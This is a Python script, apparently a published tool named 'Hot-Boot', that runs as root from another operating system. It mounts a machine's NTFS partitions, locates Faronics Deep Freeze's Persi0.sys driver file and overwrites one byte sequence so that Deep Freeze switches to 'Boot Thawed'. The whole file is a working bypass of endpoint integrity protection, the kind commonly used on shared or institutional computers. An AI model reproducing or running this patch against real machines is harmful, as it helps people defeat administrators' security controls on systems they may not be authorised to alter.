import subprocess
import os
import time
import binascii
NULL= open(os.devnull, 'w')
def printMenu():
        print('\033[36m'+'''
  ___ ___         __           __________               __             
 /   |   \  _____/  |_         \______   \ ____   _____/  |_           
/    ~    \/  _ \   __\  ______ |    |  _//  _ \ /  _ \   __\          
\    Y    (  <_> )  |   /_____/ |    |   (  <_> |  <_> )  |            
 \___|_  / \____/|__|           |______  /\____/ \____/|__|            
       \/                              \/                                                           
Hot-Boot - Universal Anti Deep Freeze Tool (6.x.x - 8.x.x)
Version 1.0
Copyright (c) 2019 Muhammet Emin TURGUT
'''+'\u001b[30m')

def listPartitions():
    drive_list=list()
    for line in os.popen('fdisk -l').readlines():
        if line.find('/dev/') !=0: continue
        if line.split()[5].lower()=="microsoft" or line.split()[5].lower()=="windows" or line.split()[5].lower().find("ntfs")!=-1:
            drive_list.append(line.split())
    return drive_list

def mountPartitions(partition_list):
    drive_index=0
    mount_list=list()
    for mount in partition_list:
        os.mkdir("/mnt/checkfreeze"+str(drive_index))
        try:
            subprocess.check_output("ntfs-3g "+mount[0]+" /mnt/checkfreeze"+str(drive_index), stderr=NULL,shell=True)
            mount_list.append("/mnt/checkfreeze"+str(drive_index))
        except:
            os.rmdir("/mnt/checkfreeze"+str(drive_index))
        drive_index+=1
    return mount_list

def checkDeepFreeze(mounted_list):
    print('\033[33m'+'[*] Searching Deep Freeze Files...')
    time.sleep(7)
    for df_dir in mounted_list:
        dirContent=os.listdir(df_dir)
        if 'Persi0.sys' in dirContent:
            print('\033[32m'+'[+] Found!')
            patchBytes(df_dir)
            opSuccess()

def patchBytes(df_dir):
    fileDirectory=df_dir+'/Persi0.sys'
    with open(fileDirectory, 'rb') as originalData:
        originalHex= binascii.hexlify(originalData.read()).decode(encoding="utf-8")
    patchedHex = originalHex.replace('7d6ecbdd', '83913422', 1)
    with open(fileDirectory, 'wb') as patchedData:
        patchedData.write(binascii.unhexlify(patchedHex))
    print('\033[32m'+'[+] Patched Bytes!')
    

def opSuccess():
    print('\033[37m'+'Deep Freeze status changed to "Boot Thawed" successfully.')
    print('\033[37m'+'If you want to remove Deep Freeze from your computer.\nVisit the Faronics website and download their latest version of Deep Freeze.\nYou can uninstall Deep Freeze through the installation file you downloaded.')

    
if __name__ == "__main__":
    if os.geteuid() == 0:
        printMenu()
        partition_list=listPartitions()
        mounted_list=mountPartitions(partition_list)
        checkDeepFreeze(mounted_list)
    else:
        print("This script must be run as root.")
